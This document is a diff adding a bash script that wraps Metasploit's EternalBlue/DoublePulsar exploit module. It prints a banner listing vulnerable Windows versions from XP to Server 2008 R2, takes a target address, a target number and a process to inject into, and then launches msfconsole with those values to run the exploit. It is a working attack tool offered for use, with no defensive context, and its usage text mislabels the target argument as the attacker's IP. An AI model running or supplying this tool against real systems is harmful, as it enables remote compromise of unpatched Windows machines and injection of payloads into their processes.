@@ -1,0 +1,53 @@
+#!/bin/bash
+#Author: DavidOfficiel
+
+[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
+clear
+ETERNALBLUEFILE="/root/.msf4/modules/exploits/windows/isak/modules"
+DOUBLEPULSARFILE="/root/.msf4/modules/exploits/windows/isak/modules"
+WINEPATH="/root/.msf4/modules/exploits/windows/isak"
+module="modules/exploits/windows/isak/eternalpulse"
+
+echo -e "\e[31m"
+echo -e " \e[1m"
+
+echo """
+
+███████╗████████╗███████╗██████╗ ███╗   ██╗ █████╗ ██╗     ██████╗ ██╗   ██╗██╗     ███████╗███████╗
+██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██║     ██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
+█████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║███████║██║     ██████╔╝██║   ██║██║     ███████╗█████╗  
+██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██╔══██║██║     ██╔═══╝ ██║   ██║██║     ╚════██║██╔══╝  
+███████╗   ██║   ███████╗██║  ██║██║ ╚████║██║  ██║███████╗██║     ╚██████╔╝███████╗███████║███████╗
+╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚══════╝
+                                                                                                    
+ + Author +
+       A
+
+ + Target List +
+  ______________________________________________
+  01| [Windows XP (all services pack) (x86) (x64)
+  02| [Windows Server 2003 SP0 (x86)
+  03| [Windows Server 2003 SP1/SP2 (x86)
+  04| [Windows Server 2003 (x64)
+  05| [Windows Vista (x86)
+  06| [Windows Vista (x64)
+  07| [Windows Server 2008 (x86)
+  09| [Windows Server 2008 R2 (x86) (x64)
+  10| [Windows 7 (all services pack) (x86) (x64)
+  -----------------------------------------------
+
++ Usage +
+ 
+ Usage:
+      [attackers ip] [TARGET] [Inject Process]
+
+ Example ~ 127.0.0.1 9 explorer.exe
+"""
+sleep 0.2
+
+if [ $# -eq 0 ] ; then
+    exit 1
+fi
+  
+msfconsole -x "clear; use $module; set RHOST $1; set ETERNALBLUEPATH $ETERNALBLUEFILE; set DOUBLEPULSARPATH $DOUBLEPULSARFILE; set WINEPATH $WINEPATH; set TARGET $2; set PROCESSINJECT $3; exploit"
+echo "starting..."
